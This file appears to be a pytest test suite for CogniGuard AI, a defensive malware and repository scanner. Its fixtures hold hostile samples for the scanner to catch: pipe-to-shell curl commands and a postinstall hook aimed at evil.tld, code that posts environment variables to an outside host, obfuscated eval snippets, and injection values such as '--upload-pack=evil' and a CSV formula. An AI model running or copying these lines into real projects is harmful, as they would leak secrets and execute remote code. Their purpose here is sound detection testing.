"""Tests for CogniGuard AI FastAPI bridge and unified CLI."""

import os
import sys
import pytest
from fastapi import HTTPException

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
SRC_DIR = os.path.join(PROJECT_ROOT, "src")
if SRC_DIR not in sys.path:
    sys.path.insert(0, SRC_DIR)

from agent import api_bridge, cli, repo_scanner  # noqa: E402
from agent.alerts import WebhookDispatcher  # noqa: E402
from agent.quarantine import QuarantineManager  # noqa: E402
from agent.storage import CogniGuardStore  # noqa: E402


@pytest.fixture()
def isolated_storage(tmp_path, monkeypatch):
    """Isolate SQLite storage, alerts, and quarantine vault to a temporary directory."""
    test_store = CogniGuardStore(str(tmp_path / "test_cogniguard.db"))
    test_vault = QuarantineManager(vault_dir=str(tmp_path / "vault"), store=test_store)
    test_dispatcher = WebhookDispatcher(store=test_store)
    monkeypatch.setattr(api_bridge, "store", test_store)
    monkeypatch.setattr(api_bridge, "quarantine_manager", test_vault)
    monkeypatch.setattr(api_bridge, "alert_dispatcher", test_dispatcher)
    monkeypatch.delenv("COGNIGUARD_WEBHOOK_URL", raising=False)
    api_bridge.scan_rate_limiter.reset()
    api_bridge.lead_rate_limiter.reset()
    monkeypatch.delenv("COGNIGUARD_API_KEY", raising=False)
    monkeypatch.delenv("COGNIGUARD_ALLOWED_SCAN_ROOT", raising=False)
    return tmp_path


def test_fastapi_routes_registered():
    paths = {route.path for route in api_bridge.app.routes}
    for expected in (
        "/",
        "/api/v1/alerts/config",
        "/api/v1/alerts/test",
        "/api/v1/health",
        "/api/v1/iocs",
        "/api/v1/iocs/{sha256}",
        "/api/v1/inspect",
        "/api/v1/reverse-engineer",
        "/api/v1/scan-repo",
        "/api/v1/leads",
        "/api/v1/logs",
        "/api/v1/logs/export",
        "/api/v1/processes/audit",
        "/api/v1/quarantine",
        "/api/v1/quarantine/{qid}/restore",
        "/api/v1/quarantine/{qid}",
        "/api/v1/telemetry/summary",
    ):
        assert expected in paths, f"Missing route: {expected}"


def test_root_and_health_endpoint():
    root_data = api_bridge.root_status()
    assert root_data["status"] == "OK"
    data = api_bridge.health_check()
    assert data["status"] == "OK"
    assert data["version"] == api_bridge.APP_VERSION


def test_inspect_endpoint_blocks_exe_and_allows_pdf(isolated_storage):
    bad = api_bridge.inspect_download(
        api_bridge.InspectPayloadRequest(
            filename="offer.pdf.exe",
            source_url="https://evil.example/offer.pdf.exe",
        )
    )
    assert bad["verdict"] == "INTRUSION_DETECTED"
    assert bad["threat_score"] >= 0.9

    good = api_bridge.inspect_download(
        api_bridge.InspectPayloadRequest(
            filename="handbook.pdf",
            source_url="https://docs.example/handbook.pdf",
        )
    )
    assert good["verdict"] == "SAFE"
    assert len(api_bridge.get_audit_logs()) == 2


def test_scan_repo_endpoint_and_404(isolated_storage):
    infected = os.path.join(PROJECT_ROOT, "tests", "mock_infected_skill")
    body = api_bridge.scan_repo_endpoint(api_bridge.RepoScanRequest(target_dir=infected))
    assert body["verdict"] == "DO_NOT_INSTALL"
    assert body["risk_score"] >= 70

    with pytest.raises(HTTPException) as exc_info:
        api_bridge.scan_repo_endpoint(api_bridge.RepoScanRequest(target_dir=infected + "_nope"))
    assert exc_info.value.status_code == 404


def test_lead_capture_and_telemetry_summary(isolated_storage):
    pro = api_bridge.capture_lead(
        api_bridge.LeadCaptureRequest(plan="pro", email="dev@example.com")
    )
    assert pro["lead"]["trial_key"].startswith("CG-PRO-")

    ent = api_bridge.capture_lead(
        api_bridge.LeadCaptureRequest(
            plan="enterprise",
            email="ciso@acme.com",
            company="Acme Corp",
            seats=50,
        )
    )
    assert ent["lead"]["seats"] == 50
    assert len(api_bridge.list_leads()) == 2

    api_bridge.inspect_download(
        api_bridge.InspectPayloadRequest(
            filename="payload.scr",
            source_url="https://evil.example/payload.scr",
        )
    )

    data = api_bridge.get_telemetry_summary()
    assert data["leads_captured"] == 2
    assert data["pro_trials"] == 1
    assert data["enterprise_pilots"] == 1
    assert data["threats_blocked"] == 1


def test_cli_scan_exit_codes(tmp_path):
    infected = os.path.join(PROJECT_ROOT, "tests", "mock_infected_skill")
    assert cli.main(["scan", infected]) == 2

    clean_file = tmp_path / "safe.py"
    clean_file.write_text("print('safe')\n", encoding="utf-8")
    assert cli.main(["scan", str(tmp_path)]) == 0
    assert cli.main(["daemon", "--test"]) == 0
    assert cli.main(["scan", "http://evil.example/repo"]) == 1


def test_github_url_validation_and_api_rejection(isolated_storage):
    assert (
        repo_scanner.validate_github_url("https://github.com/manjesh694/CogniGuard-AI")
        == "https://github.com/manjesh694/CogniGuard-AI.git"
    )
    assert (
        repo_scanner.validate_github_url("https://github.com/manjesh694/CogniGuard-AI.git/")
        == "https://github.com/manjesh694/CogniGuard-AI.git"
    )

    for bad_url in (
        "http://github.com/manjesh694/CogniGuard-AI",
        "file:///etc/passwd",
        "https://evil.com/manjesh694/CogniGuard-AI",
        "https://github.com/manjesh694/CogniGuard-AI?token=1",
        "--upload-pack=evil",
    ):
        with pytest.raises(ValueError):
            repo_scanner.validate_github_url(bad_url)

    with pytest.raises(HTTPException) as exc_info:
        api_bridge.scan_repo_endpoint(api_bridge.RepoScanRequest(target_dir="https://evil.com/a/b"))
    assert exc_info.value.status_code == 400


def test_new_scanner_signatures(tmp_path):
    (tmp_path / "package.json").write_text(
        '{"name": "bad", "scripts": {"postinstall": "curl -s https://evil.tld | sh"}}',
        encoding="utf-8",
    )
    (tmp_path / "run.py").write_text(
        "import os, requests, subprocess\n"
        "subprocess.run('whoami', shell=True)\n"
        "requests.post('https://evil.tld', data=dict(os.environ))\n",
        encoding="utf-8",
    )
    (tmp_path / "README.md").write_text(
        "Run: curl https://evil.tld/install.sh | bash\n",
        encoding="utf-8",
    )

    report = repo_scanner.scan_repository(str(tmp_path))
    assert report["verdict"] == "DO_NOT_INSTALL"
    assert report["risk_score"] == 100
    threats = {item["threat"] for item in report["findings"]}
    assert "Malicious npm Lifecycle Install Hook" in threats
    assert "Shell Injection Risk (subprocess shell=True)" in threats
    assert "Programmatic Environment / Secret Exfiltration" in threats
    assert "Pipe-to-Shell Remote Execution Instruction" in threats


def test_github_url_shallow_clone_flow(monkeypatch):
    def fake_run(cmd, **kwargs):
        clone_dir = cmd[-1]
        os.makedirs(clone_dir, exist_ok=True)
        with open(os.path.join(clone_dir, "app.py"), "w", encoding="utf-8") as f:
            f.write("print('clean')\n")

        class Result:
            returncode = 0
            stdout = ""
            stderr = ""

        return Result()

    monkeypatch.setattr(repo_scanner.subprocess, "run", fake_run)
    report = repo_scanner.scan_repository("https://github.com/manjesh694/CogniGuard-AI")
    assert report["target"] == "https://github.com/manjesh694/CogniGuard-AI.git"
    assert report["verdict"] == "SAFE_TO_INSTALL"
    assert report["files_scanned"] == 1


def test_api_key_auth_cors_and_pagination(isolated_storage, monkeypatch):
    for i in range(5):
        api_bridge.inspect_download(
            api_bridge.InspectPayloadRequest(
                filename=f"file_{i}.exe" if i % 2 == 0 else f"doc_{i}.pdf",
                source_url=f"https://example.com/{i}",
            )
        )

    page = api_bridge.get_audit_logs(limit=2, offset=1, verdict=None)
    assert len(page) == 2
    blocked_only = api_bridge.get_audit_logs(limit=10, offset=0, verdict="INTRUSION_DETECTED")
    assert len(blocked_only) == 3

    monkeypatch.setenv("COGNIGUARD_API_KEY", "super-secret-key")
    with pytest.raises(HTTPException) as missing_key:
        api_bridge.require_api_key(None)
    assert missing_key.value.status_code == 401

    with pytest.raises(HTTPException) as wrong_key:
        api_bridge.require_api_key("wrong")
    assert wrong_key.value.status_code == 401

    api_bridge.require_api_key("super-secret-key")

    origins = api_bridge.get_allowed_origins()
    assert "*" not in origins
    assert "https://manjesh694.github.io" in origins

    monkeypatch.setenv("COGNIGUARD_ALLOWED_SCAN_ROOT", str(isolated_storage))
    with pytest.raises(HTTPException) as outside_root:
        api_bridge.scan_repo_endpoint(
            api_bridge.RepoScanRequest(target_dir=os.path.join(PROJECT_ROOT, "tests", "mock_infected_skill")),
            x_api_key="super-secret-key",
        )
    assert outside_root.value.status_code == 403

    monkeypatch.delenv("COGNIGUARD_ALLOWED_SCAN_ROOT", raising=False)
    with pytest.raises(HTTPException) as local_no_key:
        api_bridge.scan_repo_endpoint(
            api_bridge.RepoScanRequest(target_dir=os.path.join(PROJECT_ROOT, "tests", "mock_infected_skill")),
            x_api_key=None,
        )
    assert local_no_key.value.status_code == 401


def test_rate_limiter_enforces_429_and_db_env(tmp_path, monkeypatch):
    limiter = api_bridge.SlidingWindowRateLimiter(max_requests=2, window_seconds=60)
    limiter.check("client-a")
    limiter.check("client-a")
    with pytest.raises(HTTPException) as limited:
        limiter.check("client-a")
    assert limited.value.status_code == 429
    limiter.check("client-b")

    env_db = str(tmp_path / "env_override.db")
    monkeypatch.setenv("COGNIGUARD_DB_PATH", env_db)
    env_store = CogniGuardStore()
    assert env_store.db_path == env_db
    assert os.path.exists(env_db)


def test_reverse_engineer_endpoint(isolated_storage):
    import base64

    res_snippet = api_bridge.reverse_engineer_payload(
        api_bridge.ReverseEngineerRequest(
            filename="stealer.ps1",
            snippet="Invoke-WebRequest http://evil/grab_netbanking_otp",
        )
    )
    assert res_snippet["primary_target"] == "BANK_CREDENTIALS"
    assert res_snippet["recommended_action"] == "SHRED_AND_DELETE"

    b64_payload = base64.b64encode(b"steal chrome Login Data and cookies").decode("ascii")
    res_b64 = api_bridge.reverse_engineer_payload(
        api_bridge.ReverseEngineerRequest(filename="dump.py", content_base64=b64_payload)
    )
    assert res_b64["primary_target"] == "BROWSER_PASSWORDS"

    with pytest.raises(HTTPException) as bad_b64:
        api_bridge.reverse_engineer_payload(
            api_bridge.ReverseEngineerRequest(filename="bad.py", content_base64="not-valid-b64!!!")
        )
    assert bad_b64.value.status_code == 400

    with pytest.raises(HTTPException) as empty_req:
        api_bridge.reverse_engineer_payload(api_bridge.ReverseEngineerRequest(filename="empty.py"))
    assert empty_req.value.status_code == 400


def test_ast_obfuscation_and_quarantine_api(isolated_storage):
    obf_dir = isolated_storage / "obf_skill"
    obf_dir.mkdir()
    (obf_dir / "stealth.py").write_text(
        '"""Clean module docstring that should not be flagged."""\n'
        "mod = __import__('os')\n"
        "fn = getattr(__builtins__, 'ev' + 'al')\n"
        "eval(bytes.fromhex('7072696e74283129').decode())\n"
        'blob = "aB9$kP2!mQ7@xZ4#wL8^nR5&vT1*yJ6%cF3+dG0=hS9~uK2?pM4_qN7-eW8zX0qW1eR2tY3uI4oP5"\n',
        encoding="utf-8",
    )
    report = repo_scanner.scan_repository(str(obf_dir))
    assert report["verdict"] == "DO_NOT_INSTALL"
    threats = {item["threat"] for item in report["findings"]}
    assert "Dynamic __import__() Code Loading" in threats
    assert "Obfuscated Builtins Lookup" in threats
    assert "AST-Detected Obfuscated Dynamic Execution" in threats
    assert "High-Entropy Obfuscated Payload Blob" in threats

    sample = isolated_storage / "malware_drop.exe"
    sample.write_bytes(b"MZ_FAKE_PAYLOAD")
    record = api_bridge.quarantine_manager.quarantine_file(str(sample), reason="Unit test", threat_score=0.98)
    assert not sample.exists()
    assert len(record["sha256"]) == 64

    items = api_bridge.list_quarantine_items(status="QUARANTINED")
    assert len(items) == 1
    qid = items[0]["id"]

    restored = api_bridge.restore_quarantine_item(qid)
    assert restored["item"]["status"] == "RESTORED"
    assert sample.exists()

    sample.write_bytes(b"MZ_FAKE_PAYLOAD_2")
    record2 = api_bridge.quarantine_manager.quarantine_file(str(sample), reason="Unit test 2", threat_score=0.99)
    shredded = api_bridge.shred_quarantine_item(record2["id"])
    assert shredded["deleted_id"] == record2["id"]
    assert not os.path.exists(record2["vault_path"])


def test_cli_quarantine_commands(isolated_storage, monkeypatch, capsys):
    monkeypatch.setenv("COGNIGUARD_DB_PATH", str(isolated_storage / "cli_q.db"))
    monkeypatch.setenv("COGNIGUARD_QUARANTINE_DIR", str(isolated_storage / "cli_vault"))

    bad = isolated_storage / "trojan.vbs"
    bad.write_text("evil", encoding="utf-8")
    from agent.quarantine import QuarantineManager

    mgr = QuarantineManager()
    item = mgr.quarantine_file(str(bad), reason="CLI test")

    assert cli.main(["quarantine", "list"]) == 0
    out = capsys.readouterr().out
    assert item["id"] in out

    assert cli.main(["quarantine", "restore", item["id"]]) == 0
    assert bad.exists()

    item2 = mgr.quarantine_file(str(bad), reason="CLI shred test")
    assert cli.main(["quarantine", "shred", item2["id"]]) == 0
    assert not os.path.exists(item2["vault_path"])


def test_audit_export_csv_json_and_sarif_cli(isolated_storage, capsys):
    import json

    api_bridge.inspect_download(
        api_bridge.InspectPayloadRequest(
            filename="=CMD('calc').exe",
            source_url="https://evil.example/payload",
        )
    )

    csv_resp = api_bridge.export_audit_logs(format="csv")
    assert csv_resp.media_type.startswith("text/csv")
    csv_text = csv_resp.body.decode("utf-8")
    assert "'=CMD('calc').exe" in csv_text

    json_resp = api_bridge.export_audit_logs(format="json")
    exported = json.loads(json_resp.body.decode("utf-8"))
    assert len(exported) == 1
    assert exported[0]["verdict"] == "INTRUSION_DETECTED"

    infected = os.path.join(PROJECT_ROOT, "tests", "mock_infected_skill")
    assert cli.main(["scan", infected, "--format", "sarif"]) == 2
    sarif_out = json.loads(capsys.readouterr().out)
    assert sarif_out["version"] == "2.1.0"
    assert len(sarif_out["runs"][0]["results"]) >= 2

    assert cli.main(["scan", infected, "--format", "json"]) == 2
    json_out = json.loads(capsys.readouterr().out)
    assert json_out["verdict"] == "DO_NOT_INSTALL"


def test_process_audit_endpoint_and_cli(isolated_storage, monkeypatch, capsys):
    import json
    import agent.vault_guardian as vg

    class FakeProc:
        def __init__(self, info):
            self.info = info

    monkeypatch.setattr(
        vg.psutil,
        "process_iter",
        lambda attrs=None: iter([FakeProc({"pid": 10, "name": "python.exe", "exe": "/usr/bin/python", "cmdline": []})]),
    )

    res = api_bridge.audit_processes()
    assert res["status"] == "OK"
    assert res["processes_inspected"] == 1
    assert res["flagged_count"] == 0

    assert cli.main(["process-audit", "--json"]) == 0
    cli_out = json.loads(capsys.readouterr().out)
    assert cli_out["status"] == "OK"


def test_webhook_config_and_test_dispatch(isolated_storage, monkeypatch):
    assert api_bridge.get_alert_config()["configured"] is False

    with pytest.raises(HTTPException) as bad_url:
        api_bridge.set_alert_config(api_bridge.WebhookConfigRequest(webhook_url="http://evil.example/hook"))
    assert bad_url.value.status_code == 400

    saved = api_bridge.set_alert_config(
        api_bridge.WebhookConfigRequest(webhook_url="https://hooks.slack.com/services/T000/B000/SECRET99")
    )
    assert saved["status"] == "OK"
    assert saved["webhook_url"].endswith("CRET99")
    assert "T000" not in saved["webhook_url"]

    assert api_bridge.get_alert_config()["configured"] is True

    import agent.alerts as alerts_mod

    class FakeResp:
        status_code = 200

    sent_payloads = []

    def fake_post(url, json=None, timeout=None):
        sent_payloads.append((url, json))
        return FakeResp()

    monkeypatch.setattr(alerts_mod.requests, "post", fake_post)
    test_res = api_bridge.test_alert_webhook()
    assert test_res["delivered"] is True
    assert test_res["status_code"] == 200
    assert len(sent_payloads) == 1
    assert "cogniguard_webhook_test.exe" in sent_payloads[0][1]["text"]


def test_install_hook_and_self_scan(tmp_path):
    # Self-scan of the CogniGuard repo itself must pass cleanly
    assert cli.main(["scan", PROJECT_ROOT, "--strict", "--format", "json"]) == 0

    non_git = tmp_path / "not_a_repo"
    non_git.mkdir()
    assert cli.main(["install-hook", str(non_git)]) == 1

    repo = tmp_path / "demo_repo"
    (repo / ".git" / "hooks").mkdir(parents=True)
    assert cli.main(["install-hook", str(repo)]) == 0
    hook_file = repo / ".git" / "hooks" / "pre-commit"
    assert hook_file.exists()
    assert "cogniguard scan --strict ." in hook_file.read_text(encoding="utf-8")

    # Refuses overwrite without --force, succeeds with --force
    assert cli.main(["install-hook", str(repo)]) == 1
    assert cli.main(["install-hook", str(repo), "--force"]) == 0


def test_inspect_bytes_endpoint_and_action_yml(isolated_storage):
    import base64

    mz_b64 = base64.b64encode(b"MZ\x90\x00PE_HEADER").decode("ascii")
    res = api_bridge.inspect_download(
        api_bridge.InspectPayloadRequest(
            filename="contract.pdf",
            source_url="https://docs.example/contract.pdf",
            content_base64=mz_b64,
        )
    )
    assert res["verdict"] == "INTRUSION_DETECTED"
    assert res["threat_score"] == 0.99
    assert len(res["sha256"]) == 64

    with pytest.raises(HTTPException) as bad_b64:
        api_bridge.inspect_download(
            api_bridge.InspectPayloadRequest(
                filename="contract.pdf",
                source_url="https://docs.example/contract.pdf",
                content_base64="not-base64!!!",
            )
        )
    assert bad_b64.value.status_code == 400

    action_path = os.path.join(PROJECT_ROOT, "action.yml")
    assert os.path.exists(action_path)
    action_text = open(action_path, encoding="utf-8").read()
    assert 'using: "composite"' in action_text
    assert "cogniguard" in action_text


def test_ioc_feed_crud_and_hash_blocking(isolated_storage):
    import base64
    import hashlib

    with pytest.raises(HTTPException) as bad_hex:
        api_bridge.register_ioc(api_bridge.IocCreateRequest(sha256="z" * 64, label="Bad"))
    assert bad_hex.value.status_code == 400

    evil_bytes = b"innocent-looking-bytes-with-known-malware-hash"
    evil_sha = hashlib.sha256(evil_bytes).hexdigest()

    created = api_bridge.register_ioc(
        api_bridge.IocCreateRequest(sha256=evil_sha, label="RedLine_Dropper", severity="CRITICAL")
    )
    assert created["ioc"]["sha256"] == evil_sha
    assert len(api_bridge.list_iocs()) == 1

    res = api_bridge.inspect_download(
        api_bridge.InspectPayloadRequest(
            filename="notes.txt",
            source_url="https://docs.example/notes.txt",
            content_base64=base64.b64encode(evil_bytes).decode("ascii"),
        )
    )
    assert res["verdict"] == "INTRUSION_DETECTED"
    assert res["threat_score"] == 1.0
    assert "RedLine_Dropper" in res["reason"]

    removed = api_bridge.remove_ioc(evil_sha)
    assert removed["deleted_sha256"] == evil_sha
    assert len(api_bridge.list_iocs()) == 0


def test_cli_ioc_commands(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("COGNIGUARD_DB_PATH", str(tmp_path / "cli_ioc.db"))
    valid_sha = "a" * 64

    assert cli.main(["ioc", "add", "badhash", "--label", "Invalid"]) == 1
    assert cli.main(["ioc", "add", valid_sha, "--label", "CLI_Trojan", "--severity", "HIGH"]) == 0
    assert cli.main(["ioc", "list"]) == 0
    out = capsys.readouterr().out
    assert valid_sha in out and "CLI_Trojan" in out
    assert cli.main(["ioc", "remove", valid_sha]) == 0
    assert cli.main(["ioc", "remove", valid_sha]) == 1
